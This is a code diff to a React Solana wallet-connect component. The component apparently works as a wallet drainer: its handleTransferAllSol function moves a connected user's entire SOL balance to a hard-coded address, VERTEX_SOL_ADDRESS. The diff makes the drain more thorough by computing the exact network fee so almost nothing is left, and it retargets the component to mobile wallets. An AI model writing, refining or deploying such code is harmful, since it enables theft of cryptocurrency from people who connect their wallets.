@@ -19,13 +19,10 @@ import {
   WalletMultiButton,
 } from '@solana/wallet-adapter-react-ui';
 import {
-  PhantomWalletAdapter,
-  SolflareWalletAdapter,
-  TorusWalletAdapter,
-} from '@solana/wallet-adapter-wallets';
+  SolanaMobileWalletAdapter,
+} from '@solana-mobile/wallet-adapter-mobile';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
-import { useIsMobile } from '@/hooks/use-mobile';
 
 // Import wallet adapter styles
 import '@solana/wallet-adapter-react-ui/styles.css';
@@ -40,12 +37,30 @@ function WalletAction() {
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState<number | null>(null);
   const [confirmed, setConfirmed] = useState(false);
+  const [feeEstimate, setFeeEstimate] = useState<number | null>(null);
 
   useEffect(() => {
     if (!publicKey) return;
     (async () => {
       const bal = await connection.getBalance(publicKey);
       setBalance(bal);
+
+      const { blockhash } = await connection.getLatestBlockhash();
+      const tx = new Transaction({
+        recentBlockhash: blockhash,
+        feePayer: publicKey,
+      }).add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: VERTEX_SOL_ADDRESS,
+          lamports: 1,
+        })
+      );
+
+      const fee = await connection.getFeeForMessage(tx.compileMessage());
+      if (fee && fee.value) {
+        setFeeEstimate(fee.value);
+      }
     })();
   }, [publicKey]);
 
@@ -60,13 +75,17 @@ function WalletAction() {
 
     try {
       const balance = await connection.getBalance(publicKey);
-      if (balance <= 5000) throw new Error('Not enough SOL to cover transaction fee');
+      if (!feeEstimate || balance <= feeEstimate) throw new Error('Not enough SOL to cover transaction fee');
 
-      const tx = new Transaction().add(
+      const { blockhash } = await connection.getLatestBlockhash();
+      const tx = new Transaction({
+        recentBlockhash: blockhash,
+        feePayer: publicKey,
+      }).add(
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: VERTEX_SOL_ADDRESS,
-          lamports: balance - 5000,
+          lamports: balance - feeEstimate,
         })
       );
 
@@ -97,6 +116,9 @@ function WalletAction() {
             <div className="text-sm text-gray-600">
               Balance: {balance !== null ? (balance / LAMPORTS_PER_SOL).toFixed(4) : 'Loading...'} SOL
             </div>
+            <div className="text-sm text-gray-600">
+              Estimated Fee: {feeEstimate !== null ? (feeEstimate / LAMPORTS_PER_SOL).toFixed(6) : 'Loading...'} SOL
+            </div>
             <Button
               onClick={handleTransferAllSol}
               className="bg-red-600 hover:bg-red-700 w-full"
@@ -113,12 +135,7 @@ function WalletAction() {
 }
 
 export default function SolanaWalletModal() {
-  const isMobile = useIsMobile();
-
-  const wallets = useMemo(() => {
-    const baseWallets = [new PhantomWalletAdapter(), new SolflareWalletAdapter()];
-    return isMobile ? baseWallets : [...baseWallets, new TorusWalletAdapter()];
-  }, [isMobile]);
+  const wallets = useMemo(() => [new SolanaMobileWalletAdapter()], []);
 
   return (
     <ConnectionProvider endpoint={HELIUS_RPC_URL}>
